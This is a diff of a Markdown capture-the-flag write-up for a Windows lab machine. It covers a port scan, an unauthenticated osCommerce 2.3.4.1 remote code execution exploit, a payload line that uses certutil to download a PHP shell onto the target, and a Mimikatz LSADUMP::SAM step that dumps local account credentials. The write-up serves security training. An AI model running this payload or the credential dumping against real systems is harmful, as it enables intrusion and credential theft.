@@ -1,5 +1,4 @@
-#Windows # #
-
+#Windows #RemoteCodeExecution #Shell
 
 **NMAP Scan**
 
@@ -14,10 +13,17 @@
 
  Open Ports
 
-* ?
-* ?
+* 80/tcp
+* 135/tcp
+* 139/tcp
+* 443/tcp
+* 445/tcp
+* 3306/tcp
+* 8080/tcp
+* and some high number ports for Microsoft Mindows RPC
 
-Port 8080/tcp is open, it takes us to the following website.
+
+Port 8080/tcp takes us to the following website.
 
 
 ![image](https://user-images.githubusercontent.com/99097743/170898695-0f88913c-e395-43be-a7f8-ded690c878f7.png)
@@ -28,21 +34,21 @@ OSCommerce is an e-commerce and online store-management software program
 
 
 
-A quick **serchsploit** search on **osCommerce 2.3.4** shows the following vulnerabilities:
+A quick **searchsploit** search on **osCommerce 2.3.4** shows the following vulnerabilities:
 
 ![image](https://user-images.githubusercontent.com/99097743/170889834-7bc4cd09-df46-41b0-ac76-48e7dc3e57ae.png)
 
 **Exploit title: osCommerce 2.3.4.1 - Remote Code Execution (PATH: php/webapps/44374.py)**
 
 * It is an interesting exploit as it does not require credentials.
-* An unauthorized attacker can reinstall, ff installation directory has not been removed.  
+* An unauthorized attacker can reinstall if installation directory has not been removed.  
 * During the reinstallation process, OS commerce does not attempt to do any authentication, it simple executes the code. 
 
-We need to update the followings inputs:
+We need to update the followings inputs in 44374.py:
 
 1) base_url: base_url = "http://10.10.83.191:8080/oscommerce-2.3.4/catalog/"
 2) target_url: target_url = "http://10.10.83.191:8080/oscommerce-2.3.4/catalog/install/install>
-3) Payload: payload += 'exec("certutil.exe -urlcache -f 10.10.83.191:8080/shell.php shell.p>
+3) Payload: payload += 'exec("certutil.exe -urlcache -f 10.10.83.191:8080/shell.php shell.php>
 
 
 ![image](https://user-images.githubusercontent.com/99097743/170901248-239aad25-20dc-48a4-9e8d-b17b2190bffe.png)
@@ -84,5 +90,24 @@ Here are the steps -- Please see the picture below for a visual illustration:
 3) Refresh the browser and trigger the process. 
 
 ![Screenshot 2022-05-29 215707](https://user-images.githubusercontent.com/99097743/170910606-a77516e1-d2b4-4451-9e6f-f0e397f16a54.png)
+
+Great, the remote code is injected and can be executed!
+
+![Screenshot 2022-05-29 221850](https://user-images.githubusercontent.com/99097743/170911203-9d49b17a-80d2-49d7-9419-3b7a4942ee6e.png)
+
+Let's try Mimikatz -- "A little tool to play with Windows security"
+
+https://github.com/gentilkiwi/mimikatz
+
+We can start with sending a new payload including **mimikatz.exe**
+
+Next, we can use **LSADUMP::SAM** command to get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts.
+
+![image](https://user-images.githubusercontent.com/99097743/170915343-36a67f7d-7337-4b10-8c43-d1f6de1de6ec.png)
+
+Here is the command to capture the root flag:
+
+![image](https://user-images.githubusercontent.com/99097743/170916055-28ad0652-2cff-42b8-8d1f-942060e1a64d.png)
+
 
 
